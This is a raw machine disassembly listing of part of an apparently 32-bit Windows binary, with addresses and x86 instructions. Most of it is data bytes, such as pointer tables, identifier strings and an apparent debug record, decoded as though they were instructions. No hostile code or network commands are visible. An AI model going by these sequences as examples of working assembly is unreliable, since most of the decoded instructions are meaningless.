  433575:	or     BYTE PTR [esi+ecx*1],cl
  433578:	jne    0x43353d
  43357a:	call   0xc3546
  43357f:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433583:	mov    ebx,DWORD PTR [eax]
  433585:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433589:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433591:	pop    esi
  433592:	and    al,0xc9
  433594:	and    al,0x10
  433596:	call   DWORD PTR [ebp-0x73]
  433599:	in     al,dx
  43359a:	jmp    esp
  43359c:	je     0x433521
  43359e:	call   DWORD PTR [eax]
  4335a0:	and    al,0x31
  4335a2:	call   0xffcd3443
  4335a7:	and    al,0x44
  4335a9:	push   edi
  4335aa:	or     al,0x41
  4335ac:	pop    esi
  4335ad:	mov    ebp,esp
  4335af:	and    al,0xc2
  4335b1:	mov    eax,DWORD PTR [eax]
  4335b3:	and    al,0x85
  4335b5:	mov    edx,0x733080e
  4335ba:	jne    0x4335b6
  4335bc:	test   DWORD PTR [ebx+0x3083275],ebx
  4335c2:	dec    DWORD PTR [ecx-0x74dbdb15]
  4335c8:	sbb    BYTE PTR [esp+edx*1],cl
  4335cb:	jl     0x4335cc
  4335cd:	adc    al,0x24
  4335cf:	dec    ebp
  4335d0:	mov    esi,DWORD PTR [ebp+0xc]
  4335d3:	mov    ecx,DWORD PTR [eax]
  4335d5:	and    al,0x39
  4335d7:	xor    ebx,DWORD PTR [ebx+ecx*4]
  4335da:	or     BYTE PTR [eax+edx*1],ah
  4335dd:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  4335e4:	clc    
  4335e5:	jmp    0x433583
  4335e7:	adc    al,bh
  4335e9:	inc    esp
  4335ea:	je     0x433638
  4335ec:	and    al,0xc2
  4335ee:	je     0x43358b
  4335f0:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  4335f6:	dec    DWORD PTR [ecx+0x235fbf08]
  4335fc:	sbb    al,0x10
  4335fe:	add    BYTE PTR [esi+edi*1+0x10],cl
  433602:	add    BYTE PTR [ebx+0xb],dh
  433605:	adc    BYTE PTR [eax],al
  433607:	mov    WORD PTR ds:0x3d450010,?
  43360d:	adc    BYTE PTR [eax],al
  43360f:	add    DWORD PTR [eax+edx*1],esp
  433612:	add    BYTE PTR [edx+0x6],cl
  433615:	adc    BYTE PTR [eax],al
  433617:	sub    dx,WORD PTR [eax]
  43361a:	add    bh,dl
  43361c:	imul   edx,DWORD PTR [eax],0x10302300
  433622:	add    BYTE PTR [esi-0x4ffef89],dl
  433628:	xor    eax,0x35ff0043
  43362d:	inc    ebx
  43362e:	add    BYTE PTR [ebx],al
  433630:	ss inc ebx
  433632:	add    BYTE PTR [edi],al
  433634:	ss inc ebx
  433636:	add    BYTE PTR [ebx],cl
  433638:	ss inc ebx
  43363a:	add    BYTE PTR [edi],cl
  43363c:	ss inc ebx
  43363e:	add    BYTE PTR [ebx],dl
  433640:	ss inc ebx
  433642:	add    BYTE PTR [edi],dl
  433644:	ss inc ebx
  433646:	add    BYTE PTR [ebx],bl
  433648:	ss inc ebx
  43364a:	add    BYTE PTR [edi],bl
  43364c:	ss inc ebx
  43364e:	add    BYTE PTR [ebx],ah
  433650:	ss inc ebx
  433652:	add    BYTE PTR [eax+0x9001011],ah
  433658:	jo     0x43366a
  43365a:	add    BYTE PTR ds:0xd7001027,ch
  433660:	pop    eax
  433661:	adc    BYTE PTR [eax],al
  433663:	push   es
  433664:	adc    al,0x10
  433666:	add    BYTE PTR [esi+0x33001031],ah
  43366c:	ins    BYTE PTR es:[edi],dx
  43366d:	adc    BYTE PTR [eax],al
  43366f:	jb     0x4336b0
  433671:	adc    BYTE PTR [eax],al
  433673:	push   ebx
  433674:	ss inc ebx
  433676:	add    BYTE PTR [edi+0x36],dl
  433679:	inc    ebx
  43367a:	add    BYTE PTR [ebx+0x36],bl
  43367d:	inc    ebx
  43367e:	add    BYTE PTR [edi+0x36],bl
  433681:	inc    ebx
  433682:	add    BYTE PTR [ebx+0x36],ah
  433685:	inc    ebx
  433686:	add    BYTE PTR [edi+0x36],ah
  433689:	inc    ebx
  43368a:	add    BYTE PTR [ebx+0x36],ch
  43368d:	inc    ebx
  43368e:	add    BYTE PTR [edi+0x36],ch
  433691:	inc    ebx
  433692:	add    dh,cl
  433694:	jge    0x4336a6
  433696:	add    BYTE PTR [esi-0x3dffef8e],dl
  43369c:	or     dl,BYTE PTR [eax]
  43369e:	add    dh,bl
  4336a0:	sub    dl,BYTE PTR [eax]
  4336a2:	add    BYTE PTR [edx],bl
  4336a4:	ins    BYTE PTR es:[edi],dx
  4336a5:	adc    BYTE PTR [eax],al
  4336a7:	addr16 jno 0x4336ba
  4336aa:	add    BYTE PTR [ebp+0x3d],ch
  4336ad:	adc    BYTE PTR [eax],al
  4336af:	lds    esp,FWORD PTR [eax+0x10]
  4336b2:	add    BYTE PTR [ebx-0x68ffbcca],dl
  4336b8:	ss inc ebx
  4336ba:	add    BYTE PTR [ebx-0x60ffbcca],bl
  4336c0:	ss inc ebx
  4336c2:	add    BYTE PTR [ebx-0x58ffbcca],ah
  4336c8:	ss inc ebx
  4336ca:	add    BYTE PTR [ebx-0x50ffbcca],ch
  4336d0:	ss inc ebx
  4336d2:	add    BYTE PTR [esp+edx*1],bh
  4336d5:	adc    BYTE PTR [eax],al
  4336d7:	clc    
  4336d8:	cmp    dl,BYTE PTR [eax]
  4336da:	add    BYTE PTR [ecx],ah
  4336dc:	pop    ds
  4336dd:	adc    BYTE PTR [eax],al
  4336df:	mov    edi,0x6001073
  4336e4:	adc    al,0x10
  4336e6:	add    BYTE PTR [ecx+0x34],bh
  4336e9:	adc    BYTE PTR [eax],al
  4336eb:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  4336ef:	shl    DWORD PTR [edx+0x10],1
  4336f2:	add    bl,dl
  4336f4:	ss inc ebx
  4336f6:	add    bh,dl
  4336f8:	ss inc ebx
  4336fa:	add    bl,bl
  4336fc:	ss inc ebx
  4336fe:	add    bh,bl
  433700:	ss inc ebx
  433702:	add    bl,ah
  433704:	ss inc ebx
  433706:	add    bh,ah
  433708:	ss inc ebx
  43370a:	add    bl,ch
  43370c:	ss inc ebx
  43370e:	add    bh,ch
  433710:	ss inc ebx
  433712:	add    BYTE PTR [ebp+0x14],al
  433715:	adc    BYTE PTR [eax],al
  433717:	fwait
  433718:	pop    ds
  433719:	adc    BYTE PTR [eax],al
  43371b:	jnp    0x433740
  43371d:	adc    BYTE PTR [eax],al
  43371f:	pop    esi
  433720:	adc    BYTE PTR cs:[eax],al
  433723:	popf   
  433724:	jno    0x433736
  433726:	add    ah,bl
  433728:	inc    ebp
  433729:	adc    BYTE PTR [eax],al
  43372b:	sbb    edx,DWORD PTR [edx+0x10]
  43372e:	add    BYTE PTR [edx+0x13001029],bl
  433734:	aaa    
  433735:	inc    ebx
  433736:	add    BYTE PTR [edi],dl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [ebx],bl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [edi],bl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [ebx],ah
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [edi],ah
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [ebx],ch
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [edi],ch
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [esp+esi*1+0x4b],dl
  433756:	aaa    
  433757:	pop    edi
  433758:	inc    edx
  433759:	dec    ebx
  43375a:	xor    DWORD PTR [ecx],edi
  43375c:	push   edi
  43375d:	add    BYTE PTR [ecx+0x39],cl
  433760:	xor    al,0x5f
  433762:	pop    ecx
  433763:	inc    edi
  433764:	push   edx
  433765:	pop    edi
  433766:	dec    edx
  433767:	xor    al,BYTE PTR [edx+0x30]
  43376a:	push   ebx
  43376b:	add    BYTE PTR [ecx+0x4a],cl
  43376e:	cmp    BYTE PTR [edi+0x38],bl
  433771:	xor    al,0x43
  433773:	xor    bl,BYTE PTR [eax+0x36]
  433776:	pop    edi
  433777:	inc    ebx
  433778:	add    BYTE PTR [edx+0x33],cl
  43377b:	dec    ebp
  43377c:	cmp    BYTE PTR [edi+0x53],bl
  43377f:	xor    DWORD PTR [eax],edi
  433781:	pop    edx
  433782:	pop    edi
  433783:	xor    BYTE PTR [edx+0x52],cl
  433786:	inc    ecx
  433787:	add    BYTE PTR [edx+0x42],al
  43378a:	inc    ebp
  43378b:	pop    edi
  43378c:	cmp    DWORD PTR [eax],edi
  43378e:	push   ebp
  43378f:	inc    edx
  433790:	xor    eax,0x5244505f
  433795:	xor    BYTE PTR [eax],al
  433797:	inc    edx
  433798:	inc    esp
  433799:	inc    edx
  43379a:	cmp    DWORD PTR [edi+0x52],ebx
  43379d:	dec    esp
  43379e:	inc    ebp
  43379f:	add    BYTE PTR [ebx+0x37],dl
  4337a2:	push   esp
  4337a3:	xor    BYTE PTR [edi+0x55],bl
  4337a6:	push   ebx
  4337a7:	aaa    
  4337a8:	dec    ebp
  4337a9:	pop    edi
  4337aa:	xor    ecx,DWORD PTR [edx+0x4e]
  4337ad:	dec    ebx
  4337ae:	add    BYTE PTR [edx+0x47],cl
  4337b1:	inc    edi
  4337b2:	xor    eax,0x534e5f32
  4337b7:	push   esp
  4337b8:	pop    edi
  4337b9:	push   esp
  4337ba:	inc    edx
  4337bb:	add    BYTE PTR [ebx+0x4d],al
  4337be:	xor    BYTE PTR [edi+0x47],bl
  4337c1:	cmp    DWORD PTR [ecx+0x5f],ebx
  4337c4:	push   eax
  4337c5:	push   ecx
  4337c6:	push   ecx
  4337c7:	pop    edi
  4337c8:	inc    ebx
  4337c9:	push   edi
  4337ca:	push   esi
  4337cb:	add    BYTE PTR [ecx+0x57],cl
  4337ce:	inc    ebp
  4337cf:	pop    edi
  4337d0:	pop    ecx
  4337d1:	push   edx
  4337d2:	inc    edx
  4337d3:	pop    edi
  4337d4:	inc    edi
  4337d5:	add    BYTE PTR [ebx+0x51],dl
  4337d8:	cmp    DWORD PTR ds:0x4d305f33,esi
  4337de:	inc    edi
  4337df:	xor    edx,DWORD PTR [edx+0x34]
  4337e2:	pop    edi
  4337e3:	pop    edx
  4337e4:	cmp    BYTE PTR [eax],al
  4337e6:	inc    edi
  4337e7:	xor    esi,DWORD PTR ds:0x5451585f
  4337ed:	dec    esp
  4337ee:	add    BYTE PTR [edi+esi*1+0x34],cl
  4337f2:	pop    edi
  4337f3:	cmp    BYTE PTR [edi+0x49],dl
  4337f6:	xor    eax,0x5700505f
  4337fb:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  4337ff:	dec    esi
  433800:	dec    edx
  433801:	cmp    BYTE PTR [eax],al
  433803:	pop    edx
  433804:	dec    ebx
  433805:	xor    eax,0x4f5f3131
  43380a:	xor    dh,BYTE PTR [ecx]
  43380c:	pop    edi
  43380d:	inc    ebp
  43380e:	push   esp
  43380f:	inc    esp
  433810:	inc    ebp
  433811:	add    BYTE PTR [edi+0x55],dl
  433814:	cmp    DWORD PTR [edi+0x5a],ebx
  433817:	push   edx
  433818:	inc    edi
  433819:	xor    DWORD PTR [ebp+0x0],ecx
  43381c:	pop    edx
  43381d:	dec    ecx
  43381e:	dec    ebp
  43381f:	ss pop edi
  433821:	pop    edx
  433822:	push   edx
  433823:	cmp    BYTE PTR [esi+0x30],dl
  433826:	pop    edi
  433827:	push   ecx
  433828:	dec    esi
  433829:	add    BYTE PTR [ebx+0x32],dl
  43382c:	inc    ebx
  43382d:	cmp    BYTE PTR [edi+0x52],bl
  433830:	dec    ecx
  433831:	xor    BYTE PTR [eax],al
  433833:	inc    edi
  433834:	xor    eax,0x314f5f4b
  433839:	xor    DWORD PTR [edi+0x38],ebx
  43383c:	push   ebp
  43383d:	add    BYTE PTR [edi+0x4b],al
  433840:	xor    bl,BYTE PTR [edi+0x43]
  433843:	push   ebp
  433844:	cmp    DWORD PTR [ebp+0x4b],ecx
  433847:	ss pop edi
  433849:	pop    edx
  43384a:	push   edi
  43384b:	inc    esp
  43384c:	xor    BYTE PTR [eax],al
  43384e:	dec    ecx
  43384f:	inc    edi
  433850:	xor    eax,0x3058555f
  433855:	dec    ebx
  433856:	pop    edi
  433857:	push   edi
  433858:	add    BYTE PTR [eax+0x0],bl
  43385b:	inc    edi
  43385c:	add    BYTE PTR [edx+0x0],al
  43385f:	pop    edi
  433860:	add    BYTE PTR [ebx],dh
  433862:	add    BYTE PTR [eax],bh
  433864:	add    BYTE PTR [ebx+0x0],cl
  433867:	xor    eax,0x33003500
  43386c:	add    BYTE PTR [eax],dh
  43386e:	add    BYTE PTR [edi+0x0],bl
  433871:	push   esp
  433872:	add    BYTE PTR [ebp+0x0],cl
  433875:	xor    BYTE PTR [eax],al
  433877:	add    BYTE PTR [eax],al
  433879:	inc    esi
  43387a:	add    BYTE PTR [eax+0x0],bl
  43387d:	xor    BYTE PTR [eax],al
  43387f:	pop    edi
  433880:	add    BYTE PTR [ecx],dh
  433882:	add    BYTE PTR [ebx+0x0],al
  433885:	xor    eax,0x5f003100
  43388a:	add    BYTE PTR [ecx+0x0],al
  43388d:	xor    eax,DWORD PTR [eax]
  43388f:	add    BYTE PTR [eax],al
  433891:	push   ebx
  433892:	add    BYTE PTR [ebx+0x0],dl
  433895:	dec    eax
  433896:	add    BYTE PTR [edi+0x0],bl
  433899:	push   esp
  43389a:	add    BYTE PTR [ebx+0x0],al
  43389d:	push   ebx
  43389e:	add    BYTE PTR [edx+0x0],dl
  4338a1:	pop    edi
  4338a2:	add    BYTE PTR [ecx+0x0],dl
  4338a5:	dec    edi
  4338a6:	add    BYTE PTR [edi+0x0],al
  4338a9:	push   ecx
  4338aa:	add    BYTE PTR [edi+0x0],bl
  4338ad:	pop    ecx
  4338ae:	add    BYTE PTR [eax],al
  4338b0:	add    BYTE PTR [edi+0x0],cl
  4338b3:	dec    edi
  4338b4:	add    BYTE PTR [ebp+0x0],dl
  4338b7:	cmp    DWORD PTR [eax],eax
  4338b9:	pop    edi
  4338ba:	add    BYTE PTR [edx],dh
  4338bc:	add    BYTE PTR [eax+eax*1+0x32],al
  4338c0:	add    BYTE PTR ds:0x47005f00,dh
  4338c6:	add    BYTE PTR ds:0x48000000,dh
  4338cc:	add    BYTE PTR [edx+0x0],cl
  4338cf:	push   eax
  4338d0:	add    BYTE PTR [edi+0x0],bl
  4338d3:	cmp    BYTE PTR [eax],al
  4338d5:	add    BYTE PTR ss:0x55004100,dh
  4338dc:	add    BYTE PTR [edi+0x0],bl
  4338df:	push   edx
  4338e0:	add    BYTE PTR [edi],dh
  4338e2:	add    BYTE PTR [ecx+0x0],cl
  4338e5:	add    BYTE PTR [eax],al
  4338e7:	inc    esp
  4338e8:	add    BYTE PTR [ecx+0x0],dl
  4338eb:	inc    edx
  4338ec:	add    BYTE PTR [edi+0x0],bl
  4338ef:	push   ecx
  4338f0:	add    BYTE PTR [ecx+0x0],bl
  4338f3:	dec    edi
  4338f4:	add    BYTE PTR [eax+0x0],dl
  4338f7:	add    BYTE PTR [eax],al
  4338f9:	dec    edx
  4338fa:	add    BYTE PTR [ecx+0x0],dl
  4338fd:	inc    esp
  4338fe:	add    BYTE PTR [edi+0x0],bl
  433901:	dec    edx
  433902:	add    BYTE PTR [eax],dh
  433904:	add    BYTE PTR [ecx],dh
  433906:	add    BYTE PTR [ebx+0x0],dl
  433909:	push   ecx
  43390a:	add    BYTE PTR [ecx],dh
  43390c:	add    BYTE PTR [edi+0x0],bl
  43390f:	push   edi
  433910:	add    BYTE PTR [eax],al
  433912:	add    BYTE PTR [ebx+0x0],cl
  433915:	pop    edx
  433916:	add    BYTE PTR [esi],dh
  433918:	add    BYTE PTR [edi+0x0],bl
  43391b:	inc    ebx
  43391c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433920:	add    BYTE PTR [edi+0x0],bl
  433923:	push   edi
  433924:	add    BYTE PTR [ebx],dh
  433926:	add    BYTE PTR [esi+0x0],cl
  433929:	push   ebp
  43392a:	add    BYTE PTR [edi+0x0],bl
  43392d:	dec    edx
  43392e:	add    BYTE PTR [eax],al
  433930:	add    BYTE PTR [edi+0x0],dl
  433933:	aaa    
  433934:	add    BYTE PTR [eax],bh
  433936:	add    BYTE PTR [edi+0x0],bl
  433939:	pop    eax
  43393a:	add    BYTE PTR [edi+0x0],cl
  43393d:	inc    edi
  43393e:	add    BYTE PTR [edi+0x0],bl
  433941:	xor    al,0x0
  433943:	push   eax
  433944:	add    BYTE PTR [ecx+0x0],cl
  433947:	push   ebp
  433948:	add    BYTE PTR [eax],al
  43394a:	add    BYTE PTR [edi+0x0],dl
  43394d:	push   esp
  43394e:	add    BYTE PTR [ebx+0x0],cl
  433951:	add    BYTE PTR [eax],al
  433953:	add    BYTE PTR [edx+0x53],dl
  433956:	inc    esp
  433957:	push   ebx
  433958:	mov    esp,DWORD PTR [esi]
  43395a:	mov    al,ds:0x544ad47
  43395f:	dec    edx
  433960:	mov    ah,0xd7
  433962:	aas    
  433963:	dec    edx
  433964:	and    eax,0x1b5c9c89
  433969:	add    BYTE PTR [eax],al
  43396b:	add    BYTE PTR [edx+edi*1+0x5c],dl
  43396f:	jns    0x4339da
  433971:	addr16 push edi
  433973:	bound  bx,DWORD PTR [edx+0x45]
  433977:	outs   dx,BYTE PTR ds:[esi]
  433978:	pop    esp
  433979:	je     0x4339ee
  43397b:	ja     0x4339be
  43397d:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433985:	js     0x4339f6
  433987:	jp     0x4339f8
  433989:	jns    0x4339ef
  43398b:	jp     0x4339f5
  43398d:	je     0x4339f3
  43398f:	jp     0x4339f3
  433991:	cs jo  0x4339f8
  433994:	bound  eax,QWORD PTR [eax]
	...
